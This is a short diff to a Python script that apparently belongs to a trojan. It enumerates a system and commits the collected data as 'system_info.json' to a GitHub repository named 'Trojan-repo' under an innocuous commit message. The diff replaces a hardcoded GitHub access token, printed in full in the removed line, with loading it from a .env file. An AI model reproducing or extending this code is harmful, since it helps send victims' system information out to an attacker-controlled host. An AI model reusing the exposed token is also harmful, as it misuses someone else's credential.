@@ -6,6 +6,7 @@ import os
 import json
 import requests
 import base64
+from dotenv import load_dotenv
 
 class SystemEnumeration:
     def __init__(self):
@@ -48,7 +49,7 @@ repository_name = "Trojan-repo"
 file_path = "data/system_info.json"  # Correct file path with filename
 file_content = json.dumps(system_info, indent=4)  # Convert dict to JSON string for GitHub
 
-os.environ["GITHUB_TOKEN"] = "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"
+load_dotenv()  # Load environment variables from .env file
 github_token = os.getenv("GITHUB_TOKEN")
 
 commit_message = 'Updated system info'
